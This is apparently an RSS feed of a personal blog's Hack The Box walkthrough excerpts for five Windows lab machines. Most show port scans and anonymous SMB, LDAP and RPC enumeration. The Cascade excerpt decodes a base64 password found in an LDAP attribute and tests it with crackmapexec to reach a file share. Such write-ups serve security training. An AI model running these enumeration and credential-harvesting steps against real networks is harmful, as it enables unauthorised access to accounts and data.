<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Smb on Personal Blog</title><link>https://0x13hrafnulf.github.io/tags/smb/</link><description>Recent content in Smb on Personal Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Wed, 04 Oct 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://0x13hrafnulf.github.io/tags/smb/index.xml" rel="self" type="application/rss+xml"/><item><title>[HTB] Machine: Sizzle</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/sizzle/</link><pubDate>Wed, 04 Oct 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/sizzle/</guid><description>&lt;h1 id="sizzle">Sizzle&lt;/h1>
&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;ul>
&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.103 --min-rate 5000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 03:19 BST
Nmap scan report for 10.10.10.103 (10.10.10.103)
Host is up (0.11s latency).
Not shown: 65506 filtered tcp ports (no-response)
PORT STATE SERVICE
21/tcp open ftp
53/tcp open domain
80/tcp open http
135/tcp open msrpc
139/tcp open netbios-ssn
389/tcp open ldap
443/tcp open https
445/tcp open microsoft-ds
464/tcp open kpasswd5
593/tcp open http-rpc-epmap
636/tcp open ldapssl
3268/tcp open globalcatLDAP
3269/tcp open globalcatLDAPssl
5985/tcp open wsman
5986/tcp open wsmans
9389/tcp open adws
47001/tcp open winrm
49664/tcp open unknown
49665/tcp open unknown
49666/tcp open unknown
49668/tcp open unknown
49677/tcp open unknown
49688/tcp open unknown
49689/tcp open unknown
49691/tcp open unknown
49694/tcp open unknown
49699/tcp open unknown
49708/tcp open unknown
49714/tcp open unknown
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p21,53,80,135,139,443,445,464,593,636,3268,3269,5985,5986,9389,47001 -sC -sV 10.10.10.103 --min-rate 5000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 03:19 BST
Nmap scan report for 10.10.10.103 (10.10.10.103)
Host is up (0.10s latency).
PORT STATE SERVICE VERSION
21/tcp open ftp Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_ SYST: Windows_NT
53/tcp open domain Simple DNS Plus
80/tcp open http Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn&amp;#39;t have a title (text/html).
| http-methods:
|_ Potentially risky methods: TRACE
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
443/tcp open ssl/http Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn&amp;#39;t have a title (text/html).
|_ssl-date: 2023-10-05T19:21:25+00:00; -7h00m01s from scanner time.
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after: 2020-07-02T17:58:55
| tls-alpn:
| h2
|_ http/1.1
| http-methods:
|_ Potentially risky methods: TRACE
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp filtered http-rpc-epmap
636/tcp filtered ldapssl
3268/tcp filtered globalcatLDAP
3269/tcp filtered globalcatLDAPssl
5985/tcp filtered wsman
5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2023-10-05T19:21:25+00:00; -7h00m01s from scanner time.
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&amp;lt;unsupported&amp;gt;, DNS:sizzle.HTB.LOCAL
| Not valid before: 2018-07-02T20:26:23
|_Not valid after: 2019-07-02T20:26:23
| tls-alpn:
| h2
|_ http/1.1
9389/tcp open mc-nmf .NET Message Framing
47001/tcp filtered winrm
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: -7h00m00s, deviation: 0s, median: -7h00m01s
| smb2-time:
| date: 2023-10-05T19:20:48
|_ start_date: 2023-10-05T19:16:02
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled and required
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.35 seconds
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>ftp&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ ftp anonymous@10.10.10.103
Connected to 10.10.10.103.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&amp;gt; dir
229 Entering Extended Passive Mode (|||56265|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp&amp;gt;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Web Server&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/sizzle/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: BankRobber</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/bankrobber/</link><pubDate>Sat, 30 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/bankrobber/</guid><description>&lt;h1 id="bankrobber">BankRobber&lt;/h1>
&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;ul>
&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.154 --min-rate 10000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 21:23 BST
Nmap scan report for 10.10.10.154 (10.10.10.154)
Host is up (0.11s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT STATE SERVICE
80/tcp open http
443/tcp open https
445/tcp open microsoft-ds
3306/tcp open mysql
Nmap done: 1 IP address (1 host up) scanned in 28.12 seconds
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p80,443,445,3306 -sC -sV 10.10.10.154 --min-rate 10000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 21:27 BST
Nmap scan report for 10.10.10.154 (10.10.10.154)
Host is up (0.13s latency).
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
443/tcp open ssl/http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after: 2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_ http/1.1
|_http-title: E-coin
445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open mysql MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb-security-mode:
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
| smb2-time:
| date: 2023-09-30T20:27:51
|_ start_date: 2023-09-30T20:21:05
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled but not required
|_clock-skew: mean: -3s, deviation: 0s, median: -4s
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.68 seconds
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>mysql&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ mysql -h 10.10.10.154 --port 3306
ERROR 1130 (HY000): Host &amp;#39;10.10.16.9&amp;#39; is not allowed to connect to this MariaDB server
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>smb&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ smbmap -H 10.10.10.154
[!] Authentication error on 10.10.10.154
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Web Server&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/bankrobber/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Fuse</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/fuse/</link><pubDate>Fri, 08 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/fuse/</guid><description>&lt;h1 id="fuse">Fuse&lt;/h1>
&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;ul>
&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.193 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 16:32 BST
Nmap scan report for 10.10.10.193 (10.10.10.193)
Host is up (0.092s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT STATE SERVICE
53/tcp open domain
80/tcp open http
88/tcp open kerberos-sec
135/tcp open msrpc
139/tcp open netbios-ssn
389/tcp open ldap
445/tcp open microsoft-ds
464/tcp open kpasswd5
593/tcp open http-rpc-epmap
636/tcp open ldapssl
3268/tcp open globalcatLDAP
3269/tcp open globalcatLDAPssl
5985/tcp open wsman
49667/tcp open unknown
49675/tcp open unknown
49676/tcp open unknown
49680/tcp open unknown
49698/tcp open unknown
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p53,80,88,135,139,445,464,593,636,3268,3269,5985 -sC -sV 10.10.10.193 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 17:23 BST
Nmap scan report for 10.10.10.193 (10.10.10.193)
Host is up (0.16s latency).
PORT STATE SERVICE VERSION
53/tcp open domain Simple DNS Plus
80/tcp open http Microsoft IIS httpd 10.0
|_http-title: Site doesn&amp;#39;t have a title (text/html).
| http-methods:
|_ Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-09 16:35:34Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open ��7a)V Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open tcpwrapped
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp open tcpwrapped
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time:
| date: 2023-09-09T16:35:42
|_ start_date: 2023-09-09T15:42:29
|_clock-skew: mean: 2h32m23s, deviation: 4h02m30s, median: 12m22s
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled and required
| smb-security-mode:
| account_used: &amp;lt;blank&amp;gt;
| authentication_level: user
| challenge_response: supported
|_ message_signing: required
| smb-os-discovery:
| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
| Computer name: Fuse
| NetBIOS computer name: FUSE\x00
| Domain name: fabricorp.local
| Forest name: fabricorp.local
| FQDN: Fuse.fabricorp.local
|_ System time: 2023-09-09T09:35:41-07:00
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>smb&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ smbclient -N -L //10.10.10.193
Anonymous login successful
Sharename Type Comment
--------- ---- -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.193 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>ldapsearch&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://10.10.10.193 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base &amp;lt;&amp;gt; (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#
#
dn:
namingContexts: DC=fabricorp,DC=local
namingContexts: CN=Configuration,DC=fabricorp,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=fabricorp,DC=local
namingContexts: DC=DomainDnsZones,DC=fabricorp,DC=local
namingContexts: DC=ForestDnsZones,DC=fabricorp,DC=local
# search result
search: 2
result: 0 Success
# numResponses: 2
# numEntries: 1
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://10.10.10.193 -x -b &amp;#34;DC=fabricorp,DC=local&amp;#34;
# extended LDIF
#
# LDAPv3
# base &amp;lt;DC=fabricorp,DC=local&amp;gt; with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#
# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A6C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v3839
# numResponses: 1
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>rpc&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ rpcclient -U &amp;#34;&amp;#34; -N 10.10.10.193
rpcclient $&amp;gt; querydispinfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $&amp;gt; enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $&amp;gt;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Web Server&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/fuse/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Cascade</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/cascade/</link><pubDate>Wed, 06 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/cascade/</guid><description>&lt;h1 id="cascade">Cascade&lt;/h1>
&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;ul>
&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.182 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 20:29 BST
Stats: 0:03:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 43.53% done; ETC: 20:36 (0:03:56 remaining)
Nmap scan report for 10.10.10.182 (10.10.10.182)
Host is up (0.093s latency).
Not shown: 65525 filtered tcp ports (no-response)
PORT STATE SERVICE
53/tcp open domain
88/tcp open kerberos-sec
135/tcp open msrpc
139/tcp open netbios-ssn
389/tcp open ldap
445/tcp open microsoft-ds
636/tcp open ldapssl
3268/tcp open globalcatLDAP
3269/tcp open globalcatLDAPssl
5985/tcp open wsman
49154/tcp open unknown
49155/tcp open unknown
49157/tcp open unknown
49170/tcp open unknown
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p53,88,135,389,445,636,3268,3269,5985 -sC -sV 10.10.10.182 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 20:33 BST
Nmap scan report for 10.10.10.182 (10.10.10.182)
Host is up (0.15s latency).
PORT STATE SERVICE VERSION
53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-05 19:33:09Z)
135/tcp open msrpc Microsoft Windows RPC
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp open microsoft-ds?
636/tcp open tcpwrapped
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp open tcpwrapped
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
Host script results:
| smb2-time:
| date: 2023-09-05T19:33:17
|_ start_date: 2023-09-05T19:28:19
|_clock-skew: -36s
| smb2-security-mode:
| 2:1:0:
|_ Message signing enabled and required
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>smb&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ smbclient -N -L //10.10.10.182
Anonymous login successful
Sharename Type Comment
--------- ---- -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.182 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
&lt;/code>&lt;/pre>&lt;h2 id="footholduser-1">Foothold/User #1&lt;/h2>
&lt;ul>
&lt;li>&lt;code>rpcclient&lt;/code>
&lt;ul>
&lt;li>&lt;a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration" target="_blank" rel="noopener">https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ rpcclient -U &amp;#39;&amp;#39; -N 10.10.10.182
rpcclient $&amp;gt; querydispinfo
index: 0xee0 RID: 0x464 acb: 0x00000214 Account: a.turnbull Name: Adrian Turnbull Desc: (null)
index: 0xebc RID: 0x452 acb: 0x00000210 Account: arksvc Name: ArkSvc Desc: (null)
index: 0xee4 RID: 0x468 acb: 0x00000211 Account: b.hanson Name: Ben Hanson Desc: (null)
index: 0xee7 RID: 0x46a acb: 0x00000210 Account: BackupSvc Name: BackupSvc Desc: (null)
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: CascGuest Name: (null) Desc: Built-in account for guest access to the computer/domain
index: 0xee5 RID: 0x469 acb: 0x00000210 Account: d.burman Name: David Burman Desc: (null)
index: 0xee3 RID: 0x467 acb: 0x00000211 Account: e.crowe Name: Edward Crowe Desc: (null)
index: 0xeec RID: 0x46f acb: 0x00000211 Account: i.croft Name: Ian Croft Desc: (null)
index: 0xeeb RID: 0x46e acb: 0x00000210 Account: j.allen Name: Joseph Allen Desc: (null)
index: 0xede RID: 0x462 acb: 0x00000210 Account: j.goodhand Name: John Goodhand Desc: (null)
index: 0xed7 RID: 0x45c acb: 0x00000210 Account: j.wakefield Name: James Wakefield Desc: (null)
index: 0xeca RID: 0x455 acb: 0x00000210 Account: r.thompson Name: Ryan Thompson Desc: (null)
index: 0xedd RID: 0x461 acb: 0x00000210 Account: s.hickson Name: Stephanie Hickson Desc: (null)
index: 0xebd RID: 0x453 acb: 0x00000210 Account: s.smith Name: Steve Smith Desc: (null)
index: 0xed2 RID: 0x457 acb: 0x00000210 Account: util Name: Util Desc: (null)
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>ldap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://10.10.10.182 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base &amp;lt;&amp;gt; (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#
#
dn:
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local
# search result
search: 2
result: 0 Success
# numResponses: 2
# numEntries: 1
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://10.10.10.182 -x -b &amp;#34;DC=cascade,DC=local&amp;#34;
...
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Only users&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://10.10.10.182 -x -b &amp;#34;DC=cascade,DC=local&amp;#34; &amp;#39;(objectClass=person)&amp;#39;
# extended LDIF
#
# LDAPv3
# base &amp;lt;DC=cascade,DC=local&amp;gt; with scope subtree
# filter: (objectClass=person)
# requesting: ALL
#
# CascGuest, Users, cascade.local
dn: CN=CascGuest,CN=Users,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: CascGuest
...
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
...
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Interesting entry &lt;code>cascadeLegacyPwd: clk0bjVldmE=&lt;/code> for &lt;code>r.thompson&lt;/code>
&lt;ul>
&lt;li>Decode it from &lt;code>base64&lt;/code>&lt;/li>
&lt;li>&lt;code>r.thompson:rY4n5eva&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ echo &amp;#34;clk0bjVldmE=&amp;#34; | base64 -d
rY4n5eva
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Let&amp;rsquo;s test the creds for &lt;code>winrm&lt;/code>
&lt;ul>
&lt;li>We only have access to &lt;code>smb&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ crackmapexec winrm 10.10.10.182 -u r.thompson -p rY4n5eva
SMB 10.10.10.182 5985 CASC-DC1 [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP 10.10.10.182 5985 CASC-DC1 [*] http://10.10.10.182:5985/wsman
WINRM 10.10.10.182 5985 CASC-DC1 [-] cascade.local\r.thompson:rY4n5eva
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva
SMB 10.10.10.182 445 CASC-DC1 [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB 10.10.10.182 445 CASC-DC1 [+] cascade.local\r.thompson:rY4n5eva
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>Data&lt;/code> share&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ smbclient //10.10.10.182/Data -U &amp;#39;r.thompson%rY4n5eva&amp;#39;
Try &amp;#34;help&amp;#34; to get a list of possible commands.
smb: \&amp;gt; prompt off
smb: \&amp;gt; recurce on
recurce: command not found
smb: \&amp;gt; recurse on
smb: \&amp;gt; mget *
NT_STATUS_ACCESS_DENIED listing \Contractors\*
NT_STATUS_ACCESS_DENIED listing \Finance\*
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Temps\*
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (4.8 KiloBytes/sec) (average 4.8 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (2.5 KiloBytes/sec) (average 3.7 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (7.9 KiloBytes/sec) (average 5.4 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (5.8 KiloBytes/sec) (average 5.5 KiloBytes/sec)
smb: \&amp;gt; exit
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>Meeting_Notes_June_2018.html&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/cascade/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Intelligence</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/intelligence/</link><pubDate>Wed, 06 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/intelligence/</guid><description>&lt;h1 id="intelligence">Intelligence&lt;/h1>
&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;ul>
&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.248 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-06 17:07 BST
Nmap scan report for 10.10.10.248 (10.10.10.248)
Host is up (0.095s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT STATE SERVICE
53/tcp open domain
80/tcp open http
88/tcp open kerberos-sec
135/tcp open msrpc
139/tcp open netbios-ssn
445/tcp open microsoft-ds
464/tcp open kpasswd5
593/tcp open http-rpc-epmap
636/tcp open ldapssl
3268/tcp open globalcatLDAP
5985/tcp open wsman
9389/tcp open adws
49667/tcp open unknown
49691/tcp open unknown
49692/tcp open unknown
49708/tcp open unknown
49714/tcp open unknown
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,9389 -sC -sV 10.10.10.248 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-06 17:11 BST
Nmap scan report for 10.10.10.248 (10.10.10.248)
Host is up (0.17s latency).
PORT STATE SERVICE VERSION
53/tcp open domain Simple DNS Plus
80/tcp open http Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_ Potentially risky methods: TRACE
|_http-title: Intelligence
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-06 23:10:33Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-06T23:11:56+00:00; +6h59m24s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after: 2022-04-19T00:43:16
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-06T23:11:57+00:00; +6h59m24s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after: 2022-04-19T00:43:16
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after: 2022-04-19T00:43:16
|_ssl-date: 2023-09-06T23:11:56+00:00; +6h59m24s from scanner time.
